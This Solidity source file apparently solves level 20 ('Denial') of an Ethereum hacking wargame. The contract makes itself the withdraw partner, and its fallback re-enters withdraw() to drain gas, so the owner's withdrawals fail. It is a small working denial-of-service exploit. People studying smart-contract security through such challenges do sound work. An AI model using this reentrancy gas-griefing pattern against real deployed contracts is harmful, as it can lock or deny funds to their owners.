// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Denial.sol";

contract Level20 {
    Denial denial;

    constructor(address payable denialAddr) public {
        denial = Denial(denialAddr);
    }

    function main() public {
        denial.setWithdrawPartner(address(this));
    }

    // Re-enter denial when we call `withdraw()`, draining gas
    fallback() external payable {
        denial.withdraw();
    }
}
